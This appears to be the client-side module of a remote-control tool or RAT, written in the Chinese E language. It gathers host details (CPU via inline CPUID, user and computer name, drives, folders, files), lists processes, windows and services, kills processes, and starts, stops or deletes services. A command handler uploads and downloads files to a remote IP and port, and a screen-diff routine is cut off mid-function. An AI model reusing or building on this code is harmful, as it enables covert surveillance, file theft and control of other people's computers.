.子程序 取系统特定目录, 文本型, , 0:WIN目录,1:SYSTEM目录,2:TEMP目录,3:我的文档,4:程序集目录,5:桌面,6:收藏夹,7:历史,8:临时文件,9:网上邻居
.参数 类型, 整数型, , 

.局部变量 缓冲区长度, 整数型, , , 
.局部变量 缓冲区, 文本型, , , 
.局部变量 i, 整数型, , , 

 ' H0& '桌面
 ' H2& '程序集
 ' H5& '我的文档
 ' H6& '收藏夹
 ' H7& '启动
 ' H8& '最近打开的文件
 ' H9& '发送
 ' &HB& '开始菜单
 ' H13& '网上邻居
 ' H14& '字体
 ' H15& 'ShellNew
 ' H1A& 'Application Data
 ' &H1B& 'PrintHood
 ' &H20& '网页临时文件
 ' &H21& 'Cookies目录
 ' &H22& '历史
赋值 (i, 0)
赋值 (缓冲区, 取空白文本 (100))
.判断开始 (等于 (类型, 0)) ' 系统WINDOWS目录
    赋值 (缓冲区长度, GetWindowsDirectoryA (缓冲区, 100))
.判断 (等于 (类型, 1)) ' 系统SYSTEM目录
    赋值 (缓冲区长度, GetSystemDirectoryA (缓冲区, 100))
.判断 (等于 (类型, 2)) ' 系统TEMP目录
    赋值 (缓冲区长度, GetTempPathA (100, 缓冲区))
.判断 (等于 (类型, 3)) ' 获得我的文档目录
    赋值 (i, 5)
.判断 (等于 (类型, 4)) ' 获得程序集目录
    赋值 (i, 2)
.判断 (等于 (类型, 5)) ' '桌面
    赋值 (i, 16)
.判断 (等于 (类型, 6)) ' 收藏夹
    赋值 (i, 6)
.判断 (等于 (类型, 7)) ' 历史
    赋值 (i, 34)
.判断 (等于 (类型, 8)) ' 网页临时文件
    赋值 (i, 32)
.判断 (等于 (类型, 9)) ' 网上邻居
    赋值 (i, 19)
.默认
    
.判断结束
.如果真 (不等于 (i, 0))
    获取特别文件夹位置 (0, i, 缓冲区长度)
    从列表id取路径 (缓冲区长度, 缓冲区)
.如果真结束
赋值 (缓冲区, 删首尾空 (缓冲区))
.如果真 (不等于 (缓冲区, “”))
    .如果真 (不等于 (取文本右边 (缓冲区, 1), “\”))
        赋值 (缓冲区, 相加 (缓冲区, “\”))
    .如果真结束
    
.如果真结束
返回 (缓冲区)

.子程序 取CPU信息_, 文本型, , 
.局部变量 信息, 文本型, , , 

赋值 (信息, 相加 (特殊_CPU取名称 (), “ ： ”, 到文本 (特殊_CPU取时钟频率 ()), “ GHz”))
返回 (信息)



 ' * “AMD Athlon(tm) 64 Processor 3000+”
 ' * “x86 Family 15 Model 15 Stepping 2”
 ' * “Advanced Micro Devices.”
 ' * “078BFBFF-00020FF2-00000000-00000000”
 ' * 1808
 ' * 32
 ' * 128
 ' * 512

 ' 调试输出 (特殊_CPU取名称 ())
 ' 调试输出 (特殊_CPU取描述 ())
 ' 调试输出 (特殊_CPU取制造商 ())
 ' 调试输出 (特殊_CPU取序列号 ())
 ' 调试输出 (特殊_CPU取时钟频率 ())
 ' 调试输出 (特殊_CPU取数据宽度 ())
 ' 调试输出 (特殊_CPU取一级缓存 ())
 ' 调试输出 (特殊_CPU取二级缓存 ())

.子程序 特殊_CPU取名称, 文本型, 公开, 
.局部变量 返回值, 文本型, , , 

赋值 (返回值, “                                                                ”)
置入代码 ({ 96, 184, 2, 0, 0, 128, 15, 162, 139, 117, 252, 54, 137, 6, 54, 137, 94, 4, 54, 137, 78, 8, 54, 137, 86, 12, 184, 3, 0, 0, 128, 15, 162, 54, 137, 70, 16, 54, 137, 94, 20, 54, 137, 78, 24, 54, 137, 86, 28, 184, 4, 0, 0, 128, 15, 162, 54, 137, 70, 32, 54, 137, 94, 36, 54, 137, 78, 40, 54, 137, 86, 44, 97 })
 ' PUSHAD
 ' MOV EAX, 80000002
 ' CPUID
 ' MOV ESI, DWORD PTR SS:[EBP-4]
 ' MOV DWORD PTR SS:[ESI], EAX
 ' MOV DWORD PTR SS:[ESI+4], EBX
 ' MOV DWORD PTR SS:[ESI+8], ECX
 ' MOV DWORD PTR SS:[ESI+C], EDX
 ' MOV EAX, 80000003
 ' CPUID
 ' MOV DWORD PTR SS:[ESI+10], EAX
 ' MOV DWORD PTR SS:[ESI+14], EBX
 ' MOV DWORD PTR SS:[ESI+18], ECX
 ' MOV DWORD PTR SS:[ESI+1C], EDX
 ' MOV EAX, 80000004
 ' CPUID
 ' MOV DWORD PTR SS:[ESI+20], EAX
 ' MOV DWORD PTR SS:[ESI+24], EBX
 ' MOV DWORD PTR SS:[ESI+28], ECX
 ' MOV DWORD PTR SS:[ESI+2C], EDX
 ' POPAD
返回 (返回值)

.子程序 特殊_CPU取描述, 文本型, 公开, 
.局部变量 参数, 整数型, , "3", 
.局部变量 返回值, 文本型, , , 

置入代码 ({ 96, 184, 1, 0, 0, 0, 15, 162, 139, 200, 129, 225, 0, 15, 0, 0, 193, 233, 8, 54, 137, 79, 244, 139, 200, 129, 225, 240, 0, 0, 0, 193, 233, 4, 54, 137, 79, 248, 139, 200, 131, 225, 15, 54, 137, 79, 252, 97 })
 ' PUSHAD
 ' MOV EAX, 1
 ' CPUID
 ' MOV ECX, EAX
 ' AND ECX, 0F00
 ' SHR ECX, 8
 ' MOV DWORD PTR SS:[EDI-C], ECX
 ' MOV ECX, EAX
 ' AND ECX, 0F0
 ' SHR ECX, 4
 ' MOV DWORD PTR SS:[EDI-8], ECX
 ' MOV ECX, EAX
 ' AND ECX, 0F
 ' MOV DWORD PTR SS:[EDI-4], ECX
 ' POPAD
赋值 (返回值, “                                                                ”)
wsprintfA (返回值, “x86 Family %d Model %d Stepping %d”, 参数)
返回 (返回值)

.子程序 特殊_CPU取制造商, 文本型, 公开, 
.局部变量 返回值, 文本型, , , 

赋值 (返回值, “            ”)
置入代码 ({ 96, 51, 192, 15, 162, 139, 69, 252, 54, 137, 24, 54, 137, 80, 4, 54, 137, 72, 8, 97 })
 ' PUSHAD
 ' XOR EAX, EAX
 ' CPUID
 ' MOV EAX, DWORD PTR SS:[EBP-4]
 ' MOV DWORD PTR SS:[EAX], EBX
 ' MOV DWORD PTR SS:[EAX+4], EDX
 ' MOV DWORD PTR SS:[EAX+8], ECX
 ' POPAD
.判断开始 (等于 (返回值, “GenuineIntel”))
    赋值 (返回值, “Intel Corporation.”)
.判断 (等于 (返回值, “AuthenticAMD”))
    赋值 (返回值, “Advanced Micro Devices.”)
.判断 (等于 (返回值, “AMD ISBETTER”))
    赋值 (返回值, “Advanced Micro Devices.”)
.判断 (等于 (返回值, “Geode By NSC”))
    赋值 (返回值, “National Semiconductor.”)
.判断 (等于 (返回值, “CyrixInstead”))
    赋值 (返回值, “Cyrix Corp., VIA Inc.”)
.判断 (等于 (返回值, “NexGenDriven”))
    赋值 (返回值, “NexGen Inc., Advanced Micro Devices.”)
.判断 (等于 (返回值, “CentaurHauls”))
    赋值 (返回值, “IDT\Centaur, Via Inc.”)
.判断 (等于 (返回值, “UMC UMC UMC ”))
    赋值 (返回值, “United Microelectronics Corp.”)
.判断 (等于 (返回值, “RiseRiseRise”))
    赋值 (返回值, “Rise.”)
.判断 (等于 (返回值, “GenuineTMx86”))
    赋值 (返回值, “Transmeta.”)
.判断 (等于 (返回值, “TransmetaCPU”))
    赋值 (返回值, “Transmeta.”)
.默认
    赋值 (返回值, “Unknown Manufacturer.”)
.判断结束
返回 (返回值)

.子程序 特殊_CPU取序列号, 文本型, 公开, 
.局部变量 参数, 整数型, , "4", 
.局部变量 返回值, 文本型, , , 

置入代码 ({ 96, 184, 1, 0, 0, 0, 15, 162, 54, 137, 87, 240, 54, 137, 71, 244, 184, 3, 0, 0, 0, 15, 162, 54, 137, 87, 248, 54, 137, 79, 252, 97 })
 ' PUSHAD
 ' MOV EAX, 1
 ' CPUID
 ' MOV DWORD PTR SS:[EDI-10], EDX
 ' MOV DWORD PTR SS:[EDI-C], EAX
 ' MOV EAX, 3
 ' CPUID
 ' MOV DWORD PTR SS:[EDI-8], EDX
 ' MOV DWORD PTR SS:[EDI-4], ECX
 ' POPAD
赋值 (返回值, “00000000-00000000-00000000-00000000”)
wsprintfA (返回值, “%08X-%08X-%08X-%08X”, 参数)
返回 (返回值)

.子程序 特殊_CPU取时钟频率, 整数型, 公开, 
.局部变量 cuStart, 长整数型, , , 
.局部变量 cuStop, 长整数型, , , 
.局部变量 nFreq, 长整数型, , , 
.局部变量 nCtrStart, 长整数型, , , 
.局部变量 nCtrStop, 长整数型, , , 

连续赋值 (0, cuStart, cuStop)
QueryPerformanceFrequency (nFreq)
置入代码 ({ 15, 49, 137, 69, 248, 137, 85, 252 })
 ' RDTSC
 ' MOV DWORD PTR SS:[cuStart], EAX
 ' MOV DWORD PTR SS:[cuStart+4], EDX
QueryPerformanceCounter (nCtrStop)
赋值 (nCtrStop, 相加 (nCtrStop, nFreq))
.循环判断首 ()
    QueryPerformanceCounter (nCtrStart)
.循环判断尾 (小于 (nCtrStart, nCtrStop))
置入代码 ({ 15, 49, 137, 69, 240, 137, 85, 244 })
 ' RDTSC
 ' MOV DWORD PTR SS:[cuStop], EAX
 ' MOV DWORD PTR SS:[cuStop+4], EDX
返回 (相除 (相减 (cuStop, cuStart), 1000, 1000))

.子程序 特殊_CPU取数据宽度, 整数型, 公开, 
.局部变量 返回值, 逻辑型, , , 

IsWow64Process (-1, 返回值)
返回 (选择 (取反 (返回值), 32, 64))

.子程序 特殊_CPU取一级缓存, 整数型, 公开, 
置入代码 ({ 83, 81, 82, 184, 5, 0, 0, 128, 15, 162, 193, 234, 24, 193, 233, 24, 3, 209, 139, 194, 90, 89, 91, 139, 229, 93, 195 })
 ' PUSH EBX
 ' PUSH ECX
 ' PUSH EDX
 ' MOV EAX, 80000005
 ' CPUID
 ' SHR EDX, 18
 ' SHR ECX, 18
 ' ADD EDX, ECX
 ' MOV EAX, EDX
 ' POP EDX
 ' POP ECX
 ' POP EBX
 ' MOV ESP, EBP
 ' POP EBP
 ' RETN
返回 (0)

.子程序 特殊_CPU取二级缓存, 整数型, 公开, 
置入代码 ({ 83, 81, 82, 184, 6, 0, 0, 128, 15, 162, 193, 233, 16, 139, 193, 90, 89, 91, 139, 229, 93, 195 })
 ' PUSH EBX
 ' PUSH ECX
 ' PUSH EDX
 ' MOV EAX, 80000006
 ' CPUID
 ' SHR ECX, 10
 ' MOV EAX, ECX
 ' POP EDX
 ' POP ECX
 ' POP EBX
 ' MOV ESP, EBP
 ' POP EBP
 ' RETN
返回 (0)

.子程序 wsprintfA, 整数型, , 
.参数 lpstr, 文本型, 参考, 
.参数 lpcstr, 文本型, , 
.参数 参数, 整数型, 数组, 

.局部变量 Address, 整数型, , , 

赋值 (Address, GetProcAddress (GetModuleHandle (“user32.dll”), “wsprintfA”))
置入代码 ({ 139, 69, 16, 139, 0, 139, 88, 4, 131, 251, 1, 124, 7, 255, 116, 152, 4, 75, 235, 244, 139, 69, 12, 255, 48, 139, 69, 8, 255, 48, 255, 85, 252 })
 ' MOV EAX, DWORD PTR SS:[EBP+10]
 ' MOV EAX, DWORD PTR DS:[EAX]
 ' MOV EBX, DWORD PTR DS:[EAX+4]
 ' @Jump1:
 ' CMP EBX, 1
 ' JL SHORT Jump2
 ' PUSH DWORD PTR DS:[EAX+EBX*4+4]
 ' DEC EBX
 ' JMP SHORT Jump1
 ' @Jump2:
 ' MOV EAX, DWORD PTR SS:[EBP+C]
 ' PUSH DWORD PTR DS:[EAX]
 ' MOV EAX, DWORD PTR SS:[EBP+8]
 ' PUSH DWORD PTR DS:[EAX]
 ' CALL DWORD PTR SS:[EBP-4]
 ' MOV ESP, EBP
 ' POP EBP
 ' RETN 0C
返回 (0)

.子程序 取屏幕分辨率, 文本型, 公开, 获取屏幕分辨率(无返回值)
.参数 色深, 短整数型, 参考 可空, 
.参数 屏幕宽度, 短整数型, 参考 可空, 
.参数 屏幕高度, 短整数型, 参考 可空, 
.参数 屏幕刷新率, 短整数型, 参考 可空, 

.局部变量 DEVMODE, 短整数型, , "61", 

EnumDisplaySettings (0, -1, DEVMODE [1])
赋值 (色深, DEVMODE [53])
赋值 (屏幕宽度, DEVMODE [55])
赋值 (屏幕高度, DEVMODE [57])
赋值 (屏幕刷新率, DEVMODE [61])
返回 (相加 (“”, 到文本 (屏幕宽度), “ x ”, 到文本 (屏幕高度), “  色深:”, 到文本 (色深), “  刷新率:”, 到文本 (屏幕刷新率)))

.子程序 取系统用户名, 文本型, 公开, 获取当前系统的用户名
.局部变量 返回文本, 文本型, , , 

赋值 (返回文本, 取空白文本 (50))
.如果真 (不等于 (_取用户名 (返回文本, 取文本长度 (返回文本)), 0))
    返回 (返回文本)
.如果真结束
返回 (“”)


.子程序 取计算机名, 文本型, 公开, 获取计算机名
.局部变量 返回文本, 文本型, , , 

赋值 (返回文本, 取空白文本 (50))
.如果真 (不等于 (_取计算机名 (返回文本, 取文本长度 (返回文本)), 0))
    返回 (返回文本)
.如果真结束
返回 (“”)


.子程序 取文件夹信息, 文本型, , 
.参数 路径, 文本型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 返回文本, 文本型, , , 
.局部变量 文件夹, 文本型, , "0", 
.局部变量 o, 整数型, , , 


.如果真 (不等于 (取文本右边 (路径, 1), “\”))
    赋值 (路径, 相加 (路径, “\”))
.如果真结束
赋值 (文件名, 寻找文件 (相加 (路径, “*.*”), 16))
.判断循环首 (不等于 (文件名, “”))
    .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
        加入成员 (文件夹, 文件名)
    .如果真结束
    赋值 (文件名, 寻找文件 (16))
.判断循环尾 ()
.计次循环首 (取数组成员数 (文件夹), o)
    赋值 (返回文本, 相加 (返回文本, 是否存在子目录 (相加 (路径, 文件夹 [o], “\”)), 文件夹 [o], “><”))
.计次循环尾 ()
返回 (返回文本)

.子程序 是否存在子目录, 文本型, , 
.参数 目录a, 文本型, , 

.局部变量 tt, 文本型, , , 
.局部变量 文件名, 文本型, , , 

赋值 (tt, “0”)
赋值 (文件名, 寻找文件 (相加 (目录a, “*.*”), 16))
.判断循环首 (不等于 (文件名, “”))
    .如果真 (并且 (不等于 (文件名, “.”), 不等于 (文件名, “..”)))
        赋值 (tt, “1”)
        跳出循环 ()
    .如果真结束
    赋值 (文件名, 寻找文件 (16))
.判断循环尾 ()
返回 (tt)


.子程序 取文件名信息, 文本型, , 
.参数 路径, 文本型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 返回文本, 文本型, , , 
.局部变量 dx, 整数型, , , 
.局部变量 日期时间, 日期时间型, , "2", 

赋值 (文件名, 寻找文件 (相加 (路径, “*.*”), ))
.判断循环首 (不等于 (文件名, “”))
    赋值 (dx, 整除 (文件_取文件尺寸 (相加 (路径, 文件名)), 1024))
    赋值 (返回文本, 相加 (返回文本, 文件名, “|”, 数值到格式文本 (相加 (dx, 1), 0, 真), “|”, 取文件时间_ (相加 (路径, 文件名)), “|”, “><”))
    赋值 (文件名, 寻找文件 ())
.判断循环尾 ()
返回 (相加 (“%工|(”, 返回文本, “%工|(”))


.子程序 取文件时间_, 文本型, , 创建时间|修改时间|访问时间
.参数 文件名, 文本型, , 

.局部变量 文件句柄, 整数型, , , 
.局部变量 系统时间结构, 系统时间, , , 
.局部变量 创建时间, FILETIME, , , 
.局部变量 修改时间, FILETIME, , , 
.局部变量 访问时间, FILETIME, , , 
.局部变量 OFSTRUCT, 文件结构信息_, , , 
.局部变量 信息文本, 文本型, , , 

赋值 (OFSTRUCT.结构长度, API_LocalSize (OFSTRUCT))
赋值 (文件句柄, API_打开文件 (文件名, OFSTRUCT, #OF_READ))
API_取文件时间 (文件句柄, 创建时间, 访问时间, 修改时间)
API_时间结构转换 (修改时间, 系统时间结构)
赋值 (信息文本, 相加 (到文本 (系统时间结构.年), “-”, 到文本 (系统时间结构.月), “-”, 到文本 (系统时间结构.日), “-”, 到文本 (相加 (系统时间结构.时, 8)), “:”, 到文本 (系统时间结构.分)))
返回 (信息文本)

.子程序 格式时间, 文本型, 公开, 将指定时间转换为文本并返回。
.参数 欲转换到文本的时间, 日期时间型, , .

.局部变量 系统时间, 系统时间, , , 

VariantTimeToSystemTime (欲转换到文本的时间, 系统时间)
返回 (相加 (到文本 (系统时间.年), “年”, 到文本 (系统时间.月), “月”, 到文本 (系统时间.日), “日”, 到文本 (系统时间.时), “时”, 到文本 (系统时间.分), “分”, 到文本 (系统时间.秒), “秒”))

.子程序 取磁盘数据, 文本型, , =1失败 =2 软盘，=3 硬盘，=4 网络映射盘，=5 光驱，=6 RAM DISK
.局部变量 临时文本, 文本型, , , 
.局部变量 返回盘符, 文本型, , , 
.局部变量 i, 整数型, , , 
.局部变量 a, 整数型, , , 
.局部变量 b, 长整数型, , , 
.局部变量 c, 长整数型, , , 
.局部变量 d, 长整数型, , , 
.局部变量 e, 长整数型, , , 
.局部变量 返回文本, 文本型, , , 
.局部变量 a1, 长整数型, , , 
.局部变量 a2, 长整数型, , , 

赋值 (临时文本, “BCDEFGHIJKLMNOPQRSTUVWXYZ”)
.如果真 (不等于 (判断硬盘类型 (“A:\”), 1))
    赋值 (返回盘符, “1A:\”)
.如果真结束
.计次循环首 (取文本长度 (临时文本), i)
    赋值 (返回盘符, 相加 (取文本中间 (临时文本, i, 1), “:\”))
    赋值 (a, 判断硬盘类型 (返回盘符))
    .如果真 (不等于 (a, 1))
        赋值 (返回文本, 相加 (返回文本, 到文本 (a), 返回盘符))
        .如果 (或者 (等于 (a, 3), 等于 (a, 2)))
            取磁盘容量 (返回盘符, b, c, d, e)
            赋值 (a1, 整除 (相乘 (e, b, c), 1073741824))
            赋值 (a2, 整除 (相乘 (d, b, c), 1073741824))
            赋值 (返回文本, 相加 (返回文本, 到文本 (“分割符”), 到文本 (a1), 到文本 (“分割符”), 到文本 (a2), 到文本 (“分割符”), “||~!@#$%^&||”))
             ' 返回文本 ＝ 返回文本 ＋ “(共” ＋ 到文本 (a1) ＋ “GB\剩” ＋ 到文本 (a2) ＋ “GB)&”
        .否则
            赋值 (返回文本, 相加 (返回文本, “||~!@#$%^&||”))
        .如果结束
        
    .如果真结束
    
.计次循环尾 ()
返回 (返回文本)

.子程序 传输操作, 空白型, , 
.参数 字节集, 字节集, , 

.局部变量 字节集变量, 字节集, , "0", 
.局部变量 a, 整数型, , , 
.局部变量 文件长度, 长整数型, , , 
.局部变量 长度字节集, 字节集, , , 
.局部变量 返回信息, 整数型, , , 

赋值 (字节集变量, 分割字节集 (字节集, 到字节集 (“|”), ))
.如果真 (大于或等于 (取数组成员数 (字节集变量), 3))
    .判断开始 (等于 (到文本 (字节集变量 [1]), “下载”))
        赋值 (长度字节集, 取字节集右边 (字节集, 8))
        拷贝字节集到内存 (长度字节集, 取长整数变量指针 (文件长度), 8)
        .如果 (大于 (文件长度, 0))
            赋值 (传输.发送, 假)
            赋值 (传输.本地路径, 到文本 (字节集变量 [2]))
            赋值 (传输.大小, 文件长度)
            .如果真 (不等于 (传输线程, 0))
                CloseHandle (传输线程)
                销毁线程 (传输线程, 0)
                赋值 (传输线程, 0)
            .如果真结束
            赋值 (传输线程, 线程启动 (&传输线程a))
        .否则
             ' 通知重试
            返回通知 (6)
        .如果结束
        
    .判断 (等于 (到文本 (字节集变量 [1]), “上传”))
        赋值 (传输.发送, 真)
        赋值 (传输.本地路径, 到文本 (字节集变量 [2]))
        .如果真 (不等于 (传输线程, 0))
            CloseHandle (传输线程)
            销毁线程 (传输线程, 0)
            赋值 (传输线程, 0)
        .如果真结束
        赋值 (传输线程, 线程启动 (&传输线程a))
    .默认
        
    .判断结束
    
.如果真结束


.子程序 传输线程a, 空白型, , 
.局部变量 返回信息, 整数型, , , 

.如果 (等于 (传输.发送, 假))
    目录操作_创建目录 (取文本左边 (传输.本地路径, 倒找文本 (传输.本地路径, “\”, , 假)))
    赋值 (返回信息, 下载项目 (IP, 传输端口, 传输.本地路径, 传输.大小))
    赋值 (传输线程, 0)
    返回通知 (返回信息)
.否则
    赋值 (返回信息, 上传项目 (IP, 传输端口, 传输.本地路径))
    赋值 (传输线程, 0)
    返回通知 (返回信息)
.如果结束


.子程序 线程启动, 整数型, , 创建一个线程来启动子程序(返回线程号)
.参数 线程子程序, 子程序指针, , 欲启动的线程子程序指针

.局部变量 线程号, 整数型, , , 

创建线程 (0, 0, 线程子程序, 0, 0, 线程号)
返回 (线程号)

.子程序 返回通知, 空白型, , 
.参数 整数, 整数型, , 

传送数据子程序 (1, 相加 ({ 4 }, { 3 }, 到字节集 (相加 (“传输”, #分割符, 到文本 (整数)))))

.子程序 枚举系统进程, 文本型, , ID|文件名|线程数|基本优先级  信息使用换行符分割
.局部变量 快照句柄, 整数型, , , 
.局部变量 pe32, 进程结构, , , 
.局部变量 r, 逻辑型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 进程名, 文本型, , , 
.局部变量 临时文本, 文本型, , , 

赋值 (快照句柄, CreateToolhelp32Snapshot (2, 0))
赋值 (pe32.结构长度, 296)
.如果真 (等于 (快照句柄, -1))
    返回 (“”)
.如果真结束
赋值 (r, Process32First (快照句柄, pe32))
.判断循环首 (r)
    赋值 (进程名, 到文本 (pe32.进程名))
    .如果真 (大于 (pe32.进程ID, 10))
        赋值 (临时文本, 取模块路径 (pe32.进程ID))
        .如果真 (不等于 (临时文本, “”))
            赋值 (进程名, 临时文本)
        .如果真结束
        
    .如果真结束
    赋值 (结果文本, 相加 (结果文本, 到文本 (pe32.进程ID), “|”, 进程名, “|”, 到文本 (pe32.线程数), “|”, 到文本 (pe32.线程优先级), #换行符))
    赋值 (r, Process32Next (快照句柄, pe32))
.判断循环尾 ()
CloseHandle (快照句柄)
返回 (结果文本)

.子程序 枚举窗口, 文本型, , 
.参数 进程句柄, 整数型, 可空, 

.局部变量 cd, 整数型, , , 
.局部变量 cd1, 整数型, , , 
.局部变量 wb, 文本型, , , 
.局部变量 win, 整数型, , , 
.局部变量 窗口信息, 文本型, , , 
.局部变量 进程ID, 整数型, , , 

赋值 (win, FindWindowEx (0, 0, 0, 0))
.判断循环首 (不等于 (win, 0))
    赋值 (cd, GetWindowTextLength (win))
    .如果真 (大于或等于 (cd, 1))
        赋值 (wb, 取空白文本 (相加 (cd, 1)))
        赋值 (cd1, GetWindowText_ (win, wb, 取文本长度 (wb)))
        .如果真 (并且 (不等于 (wb, “Default IME”), 不等于 (wb, “”)))
            .如果 (大于 (进程句柄, 0))
                GetWindowThreadProcessId (win, 进程ID)
                .如果真 (等于 (进程ID, 进程句柄))
                    赋值 (窗口信息, 相加 (窗口信息, wb, 整数补位 (win, 9), #换行符))
                .如果真结束
                
            .否则
                赋值 (窗口信息, 相加 (窗口信息, wb, 整数补位 (win, 9), #换行符))
            .如果结束
            
        .如果真结束
        
    .如果真结束
    赋值 (win, FindWindowEx (0, win, 0, 0))
.判断循环尾 ()
返回 (窗口信息)

.子程序 终止进程_, 逻辑型, , 
.参数 参进程号, 空白型, , 

.局部变量 进程句柄, 空白型, , , 
.局部变量 r, 逻辑型, , , 

赋值 (进程句柄, OpenProcess (1, 0, 参进程号))
.如果真 (等于 (进程句柄, 0))
    返回 (假)
.如果真结束
赋值 (r, TerminateProcess1 (进程句柄, 1))
返回 (r)

.子程序 取模块路径, 文本型, , 
.参数 processid, 整数型, , 

.局部变量 snap, 整数型, , , 
.局部变量 mod, 模块信息, , , 

赋值 (snap, CreateToolhelp32Snapshot (8, processid))
.如果真 (等于 (snap, -1))
    返回 (“”)
.如果真结束
赋值 (mod.size, 1024)
Module32First1 (snap, mod)
CloseHandle (snap)
返回 (到文本 (mod.szpath))

.子程序 整数补位, 文本型, , 
.参数 整数, 整数型, , 
.参数 位数a, 整数型, , 

.局部变量 文本, 文本型, , , 
.局部变量 i, 整数型, , , 

赋值 (文本, 到文本 (整数))
赋值 (i, 相减 (位数a, 取文本长度 (文本)))
返回 (相加 (取空白文本 (i), 文本))

.子程序 枚举服务, 文本型, , 
.局部变量 Status, 字节集, , , 
.局部变量 StatusSize, 整数型, , , 
.局部变量 服务数, 空白型, , , 
.局部变量 i, 空白型, , , 
.局部变量 Service, ENUM_SERVICE_STATUS_PROCESS, , , 
.局部变量 表项索引, 空白型, , , 
.局部变量 文本, 文本型, , , 
.局部变量 返回值, 文本型, , , 
.局部变量 SC句柄, 空白型, , , 

赋值 (SC句柄, API_OpenSCManager (0, 0, #SC_MANAGER_ENUMERATE_SERVICE))
.如果真 (等于 (SC句柄, 0))
    返回 (“查看服务失败。。可能权限不够”)
.如果真结束
API_EnumServicesStatusEx (SC句柄, 0, #SERVICE_WIN32, #SERVICE_STATE_ALL, Status, 0, StatusSize, 服务数, 0, 0)
赋值 (Status, 取空白字节集 (StatusSize))
.如果真 (等于 (API_EnumServicesStatusEx (SC句柄, 0, #SERVICE_WIN32, #SERVICE_STATE_ALL, Status, StatusSize, StatusSize, 服务数, 0, 0), 0))
    返回 (“查看服务失败”)
.如果真结束
.计次循环首 (服务数, i)
    RtlMoveMemory (Service, 取字节集中间 (Status, 相减 (相乘 (i, 44), 43), 44), 44)
    赋值 (返回值, 相加 (返回值, Service.lpServiceName, “|”, Service.lpDisplayName, “|”))
    赋值 (文本, 取文本注册项 (4, 相加 (“SYSTEM\CurrentControlSet\Services\”, Service.lpServiceName, “\Description”), ))
    赋值 (返回值, 相加 (返回值, 文本, “|”))
    .判断开始 (等于 (取文本注册项 (#本地机器, 相加 (“SYSTEM\CurrentControlSet\Services\”, Service.lpServiceName, “\ObjectName”), ), “LocalSystem”))
        赋值 (文本, “本地系统”)
    .判断 (等于 (取文本注册项 (#本地机器, 相加 (“SYSTEM\CurrentControlSet\Services\”, Service.lpServiceName, “\ObjectName”), ), “NT AUTHORITY\LocalService”))
        赋值 (文本, “本地服务”)
    .默认
        赋值 (文本, “网络服务”)
    .判断结束
    赋值 (返回值, 相加 (返回值, 文本, “|”))
    赋值 (文本, 状态 (Service.dwCurrentState))
    赋值 (返回值, 相加 (返回值, 文本, “|”))
    .判断开始 (等于 (取数值注册项 (#本地机器, 相加 (“SYSTEM\CurrentControlSet\Services\”, Service.lpServiceName, “\Start”), ), 2))
        赋值 (文本, “自动”)
    .判断 (等于 (取数值注册项 (#本地机器, 相加 (“SYSTEM\CurrentControlSet\Services\”, Service.lpServiceName, “\Start”), ), 3))
        赋值 (文本, “手动”)
    .默认
        赋值 (文本, “已禁用”)
    .判断结束
    赋值 (返回值, 相加 (返回值, 文本, #换行符))
.计次循环尾 ()
返回 (返回值)

.子程序 状态, 文本型, , 
.参数 N, 整数型, , 

.如果真 (并且 (大于或等于 (N, 1), 小于或等于 (N, 7)))
    返回 (多项选择 (N, “已停止”, “准备开始”, “准备停止”, “正在运行”, “准备继续”, “准备暂停”, “已暂停”))
.如果真结束
返回 (相加 (“未知状态：”, 到文本 (N)))

.子程序 取服务状态, 文本型, , 
.参数 服务名a, 文本型, , 

.局部变量 服务状态, 服务状态, , , 
.局部变量 服务句柄, 空白型, , , 
.局部变量 缓冲区, 字节集, , , 
.局部变量 a, 整数型, , , 
.局部变量 返回值, 文本型, , , 
.局部变量 SC句柄, 整数型, , , 

输出调试文本 (服务名a)
赋值 (SC句柄, API_OpenSCManager (0, 0, #SC_MANAGER_ENUMERATE_SERVICE))
.如果真 (等于 (SC句柄, 0))
    返回 (“查看服务失败。。可能权限不够”)
.如果真结束
赋值 (a, 取数值注册项 (#本地机器, 相加 (“SYSTEM\CurrentControlSet\Services\”, 服务名a, “\Start”), ))
赋值 (服务句柄, OpenService (SC句柄, 服务名a, #SC_MANAGER_ENUMERATE_SERVICE))
API_QueryServiceStatus (服务句柄, 服务状态)
.如果 (或者 (等于 (a, 2), 等于 (a, 3)))
    .如果 (等于 (服务状态.dwCurrentState, 4))
        赋值 (缓冲区, 取空白字节集 (36))
        API_QueryServiceStatusEx (服务句柄, 0, 缓冲区, 36, 36)
        赋值 (返回值, 相加 (到文本 (服务状态.dwCurrentState), “|”, 状态 (服务状态.dwCurrentState), “   PID:”, 到文本 (取字节集数据 (取字节集中间 (缓冲区, 29, 32), 3, )), “|”))
    .否则
        赋值 (返回值, 相加 (到文本 (服务状态.dwCurrentState), “|”, 状态 (服务状态.dwCurrentState), “|”))
    .如果结束
    
.否则
    赋值 (返回值, 相加 (到文本 (服务状态.dwCurrentState), “|”, 状态 (服务状态.dwCurrentState), “|”))
.如果结束
赋值 (返回值, 相加 (返回值, 取文本注册项 (4, 相加 (“SYSTEM\CurrentControlSet\Services\”, 服务名a, “\ImagePath”), )))
返回 (相加 (返回值, #换行符))

.子程序 启动服务, 文本型, , 
.参数 服务名, 文本型, , 

.如果真 (等于 (API_StartService (OpenService (API_OpenSCManager (0, 0, 983103), 服务名, 983551), 0, 0), 0))
    返回 (“服务启动失败”)
.如果真结束
延时 (1000)
返回 (取服务状态 (服务名))

.子程序 停止服务, 文本型, , 
.参数 服务名, 文本型, , 

.局部变量 Service, 服务状态, , , 
.局部变量 服务句柄, 空白型, , , 

赋值 (服务句柄, OpenService (API_OpenSCManager (0, 0, 983103), 服务名, 983551))
.如果真 (等于 (API_ControlService (服务句柄, 1, Service), 0))
    返回 (“服务停止失败”)
.如果真结束
延时 (1000)
返回 (取服务状态 (服务名))

.子程序 删除服务, 逻辑型, , 
.参数 服务名, 文本型, , 

.如果真 (等于 (API_DeleteService (OpenService (API_OpenSCManager (0, 0, 983103), 服务名, 983551)), 0))
    返回 (假)
.如果真结束
返回 (真)

.子程序 取图片差异, 字节集, , 
.参数 原图, 字节集, , 
.参数 对比图, 字节集, , 

.局部变量 图像宽, 整数型, , , 
.局部变量 图像高, 整数型, , , 
.局部变量 数据, 字节集, , , 
.局部变量 偏移, 整数型, , , 

赋值 (图像宽, 相加 (原图 [19], 相乘 (原图 [20], 256)))
赋值 (图像高, 相加 (原图 [23], 相乘 (原图 [24], 256)))
赋值 (数据, 对比图)
